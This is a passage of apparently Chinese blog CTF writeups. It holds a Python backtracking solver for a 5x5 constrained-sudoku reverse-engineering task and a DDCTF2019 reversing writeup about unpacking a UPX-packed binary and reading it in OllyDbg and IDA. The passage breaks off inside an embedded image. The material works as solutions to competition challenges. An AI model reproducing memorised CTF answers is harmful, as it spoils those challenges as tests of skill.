<p><a href="https://blog.csdn.net/chqj_163/article/details/90238350">https://blog.csdn.net/chqj_163/article/details/90238350</a></p>
<p>利用<code>llvm</code>可以反编译源码或者直接编译成可执行程序。这里我做这道题的时候是队友直接给我的编译好的可执行文件。</p>
<p>IDA一条龙发现，逻辑十分简单，就是一个5x5的数独，三张表，一张表是地图，一张是每一行内的自定义约束规则，一张是每一列内的自定义约束规则，可以手算可以写脚本，5x5其实直接手算就行.</p>
<p>解数独脚本如下：（注意程序中有 <strong>一个输入检验函数要求初始地图已经给出的数据的位置</strong> 输入为 <strong>0</strong>）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_grid</span>(<span class="params">arr</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="comment"># 注意，在py3.x中，print函数默认都有换行</span></span><br><span class="line">            <span class="built_in">print</span>(arr[i][j], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找出目前没有被赋值的位置，若全部都被填满，则返回False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_empty_location</span>(<span class="params">arr, l</span>):</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="keyword">if</span> arr[row][col] == <span class="number">0</span>:</span><br><span class="line">                l[<span class="number">0</span>] = row</span><br><span class="line">                l[<span class="number">1</span>] = col</span><br><span class="line">                <span class="comment"># print(&quot;empty: row=&quot;+str(row)+&quot; col=&quot;+str(col))</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找出num在该arr的row行是否出现过</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">used_in_row</span>(<span class="params">arr, row, num</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">if</span> arr[row][i] == num:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找出num在该arr的col列是否出现过</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">used_in_col</span>(<span class="params">arr, col, num</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">if</span> arr[i][col] == num:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_location_is_safe</span>(<span class="params">arr, row, col, num</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> used_in_row(arr, row, num) <span class="keyword">and</span> <span class="keyword">not</span> used_in_col(arr, col, num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_sudoku</span>(<span class="params">arr</span>):</span></span><br><span class="line">    <span class="comment"># 当前搜索的第几行、第几列</span></span><br><span class="line">    l = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 找出还未被填充的位置</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> find_empty_location(arr, l):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 未被填充的位置，赋值给row，col</span></span><br><span class="line">    row = l[<span class="number">0</span>]</span><br><span class="line">    col = l[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> check_location_is_safe(arr, row, col, num):</span><br><span class="line">            arr[row][col] = num</span><br><span class="line">            <span class="comment">#print_grid(arr)</span></span><br><span class="line">            <span class="keyword">if</span> solve_sudoku(arr):</span><br><span class="line">                row_123 = [[<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>],</span><br><span class="line">                [<span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>],</span><br><span class="line">                [<span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>],</span><br><span class="line">                [<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>],</span><br><span class="line">                [<span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>]]</span><br><span class="line">                col_123 = [[<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x02</span>],</span><br><span class="line">                [<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>],</span><br><span class="line">                [<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>],</span><br><span class="line">                [<span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>]]</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">                    <span class="keyword">if</span> row_123[i//<span class="number">4</span>][i%<span class="number">4</span>] == <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">if</span> arr[i//<span class="number">4</span>][i%<span class="number">4</span>] &lt; arr[i//<span class="number">4</span>][i%<span class="number">4</span>+<span class="number">1</span>]:</span><br><span class="line">                            flag = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">elif</span> row_123[i//<span class="number">4</span>][i%<span class="number">4</span>] == <span class="number">2</span>:</span><br><span class="line">                        <span class="keyword">if</span> arr[i//<span class="number">4</span>][i%<span class="number">4</span>] &gt; arr[i//<span class="number">4</span>][i%<span class="number">4</span>+<span class="number">1</span>]:</span><br><span class="line">                            flag = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> col_123[i//<span class="number">5</span>][i%<span class="number">5</span>] == <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">if</span> arr[i//<span class="number">5</span>][i%<span class="number">5</span>] &gt; arr[i//<span class="number">5</span>+<span class="number">1</span>][i%<span class="number">5</span>]:</span><br><span class="line">                            flag = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">elif</span> col_123[i//<span class="number">5</span>][i%<span class="number">5</span>] == <span class="number">2</span>:</span><br><span class="line">                        <span class="keyword">if</span> arr[i//<span class="number">5</span>][i%<span class="number">5</span>] &lt; arr[i//<span class="number">5</span>+<span class="number">1</span>][i%<span class="number">5</span>]:</span><br><span class="line">                            flag = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">                    print_grid(grid)</span><br><span class="line">                    <span class="built_in">print</span>()</span><br><span class="line">                    <span class="built_in">print</span>()</span><br><span class="line">            <span class="comment"># 若当前num导致未来并没有结果，则当前所填充的数无效，置0后选下一个数测试</span></span><br><span class="line">            arr[row][col] = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#grid = [[0 for x in range(5)] for y in range(5)]</span></span><br><span class="line">    grid = [[ <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">            [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">            [<span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">            [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>],</span><br><span class="line">            [<span class="number">0</span>,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]]</span><br><span class="line">    solve_sudoku(grid)</span><br></pre></td></tr></table></figure>
<h3 id="HMI"><a href="#HMI" class="headerlink" title="HMI"></a>HMI</h3><p>敬请期待2333</p>
<h2 id="Web-请点击跳转"><a href="#Web-请点击跳转" class="headerlink" title="Web(请点击跳转)"></a><a href="http://xibai.xyz/2021-ciscn-online-web.pdf">Web(请点击跳转)</a></h2>]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Reverse1_final</title>
    <url>/2019/04/13/reverse1_final/</url>
    <content><![CDATA[<p>DDCTF2019届最简单的逆向题</p>
<p>直接拉进od，发现进去之后不像是在正常的程序领空，PEiD查一下，发现是一个UPX类型的壳。<br>百度下载脱壳机，脱壳。<br>然后拉入od分析，发现我们输入的字符串被程序加密后与“<code>DDCTF&#123;reverseME&#125;</code>”作比较；<br>也就是flag输入进去之后会被程序加密为“<code>DDCTF&#123;reverseME&#125;</code>”；<br>将其拉入ida分析<br><img src='data:img/jpg;base64,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
